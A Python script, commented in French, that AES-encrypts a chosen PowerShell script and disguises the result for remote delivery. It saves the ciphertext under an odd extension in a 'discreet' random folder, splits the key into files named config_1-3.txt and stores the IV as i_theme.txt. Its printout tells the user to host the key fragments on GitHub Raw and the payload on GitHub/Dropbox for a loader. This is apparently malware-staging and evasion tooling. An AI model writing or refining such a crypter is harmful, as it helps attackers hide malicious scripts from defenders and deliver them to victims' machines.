import os
import base64
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tkinter import Tk, filedialog

def split_key(key: bytes, parts=3):
    part_len = len(key) // parts
    fragments = [key[i*part_len:(i+1)*part_len] for i in range(parts-1)]
    fragments.append(key[(parts-1)*part_len:])  # le dernier fragment prend le reste
    return fragments

def encrypt_file(file_path):
    # Générer une clé AES-256 et un IV
    key = secrets.token_bytes(32)
    iv = secrets.token_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Lire le contenu du fichier à chiffrer
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    # Chiffrement + Base64
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    encrypted_b64 = base64.b64encode(ciphertext)

    # === Créer dossier enc_s/<nom_random> ===
    random_folder = secrets.token_hex(4)  # dossier court & discret
    encrypted_root = os.path.join(os.getcwd(), "enc_s")
    os.makedirs(encrypted_root, exist_ok=True)

    output_dir = os.path.join(encrypted_root, random_folder)
    os.makedirs(output_dir, exist_ok=True)

    # Nom de base du script pour le fichier chiffré
    base_name = os.path.splitext(os.path.basename(file_path))[0]

    # Sauvegarde du fichier chiffré
    enc_path = os.path.join(output_dir, base_name + ".m1d0b4n")
    with open(enc_path, 'wb') as f:
        f.write(encrypted_b64)

    # Sauvegarde de l’IV
    iv_path = os.path.join(output_dir, "i_theme.txt")
    with open(iv_path, 'w') as f:
        f.write(base64.b64encode(iv).decode())

    # Découper la clé en 3 fragments et sauvegarder
    fragments = split_key(key, 3)
    for i, frag in enumerate(fragments, start=1):
        frag_path = os.path.join(output_dir, f"config_{i}.txt")
        with open(frag_path, 'w') as f:
            f.write(base64.b64encode(frag).decode())

    print(f"\n✅ Chiffrement terminé !")
    print(f"📂 Tous les fichiers ont été placés dans : {output_dir}")
    print("\nTu peux maintenant uploader :")
    print(f"- config_1.txt, config_2.txt, config_3.txt sur des GitHub Raw")
    print(f"- i_theme.txt à part, ou dans le loader")
    print(f"- {base_name}.m1d0b4n à héberger sur GitHub/Dropbox")

def main():
    # Ouvre un explorateur de fichiers pour choisir le fichier à chiffrer
    Tk().withdraw()  # cacher la fenêtre Tkinter
    print("[*] Sélectionne le fichier à chiffrer...")
    file_path = filedialog.askopenfilename(
        title="Sélectionner le script à chiffrer",
        filetypes=[("PowerShell scripts", "*.ps1"), ("Tous les fichiers", "*.*")]
    )

    if not file_path:
        print("[!] Aucun fichier sélectionné. Abandon.")
        return

    encrypt_file(file_path)

if __name__ == "__main__":
    main()
